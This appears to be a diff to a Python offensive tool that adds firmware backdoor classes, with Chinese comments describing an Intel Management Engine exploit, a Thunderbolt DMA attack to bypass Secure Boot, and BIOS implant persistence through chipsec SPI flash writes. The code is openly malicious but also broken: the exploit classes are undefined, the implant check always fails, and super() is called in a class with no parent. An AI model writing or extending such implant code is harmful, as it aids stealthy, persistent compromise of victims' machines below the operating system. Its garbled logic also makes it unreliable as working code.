@@ -95,6 +95,27 @@ class FirmwareImplant:
         """刷写修改后的固件（需物理接触或漏洞利用）"""
         subprocess.run(f"chipsec_util spi write {modified_firmware}", shell=True, check=True)
 
+
+class FirmwareBackdoor:
+    def __init__(self):
+        self.intel_me_exploit = IntelMEExploit()  # 自定义Intel管理引擎漏洞利用
+        self.thunderbolt_dma = ThunderboltDMA()  # 雷电接口DMA攻击
+
+    def implant(self):
+        if self._check_secure_boot():
+            self.thunderbolt_dma.inject()  # 绕过Secure Boot
+        else:
+            self.intel_me_exploit.flash()  # 直接写入固件
+
+
+# BIOS植入升级
+class FirmwareImplant:
+    def flash_bios(self, modified_firmware):
+        if FirmwareBackdoor().implant():  # 优先硬件级植入
+            print("[+] 硬件持久化成功")
+        else:
+            super().flash_bios(modified_firmware)  # 回退传统方式
+
 # 使用示例
 if __name__ == "__main__":
     implant = FirmwareImplant()
